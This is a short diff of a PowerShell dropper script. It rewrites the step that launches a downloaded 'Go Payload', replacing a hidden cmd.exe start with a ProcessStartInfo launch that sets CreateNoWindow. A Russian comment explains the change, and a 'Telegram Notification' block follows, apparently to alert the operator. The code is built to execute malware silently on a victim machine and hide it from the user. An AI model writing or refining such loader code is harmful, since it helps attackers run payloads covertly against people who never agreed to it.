@@ -59,8 +59,18 @@ try {
 }
 
 if (Test-Path $outPath) {
-    Write-Host "[+] Direct Executing payload..."
-    Start-Process -FilePath "cmd.exe" -ArgumentList "/c start `"`" `"$outPath`"" -WorkingDirectory $targetDir -WindowStyle Hidden
+    Write-Host "[+] Executing Go Payload with Independent Console Context..."
+    
+    # 0x08000000 = CREATE_NO_WINDOW (Создает чистый процесс без отнаследованных хэндлов)
+    $pinfo = New-Object System.Diagnostics.ProcessStartInfo
+    $pinfo.FileName = $outPath
+    $pinfo.WorkingDirectory = $targetDir
+    $pinfo.UseShellExecute = $false
+    $pinfo.CreateNoWindow = $true
+    
+    $p = New-Object System.Diagnostics.Process
+    $p.StartInfo = $pinfo
+    $null = $p.Start()
 }
 # Telegram Notification
 try {
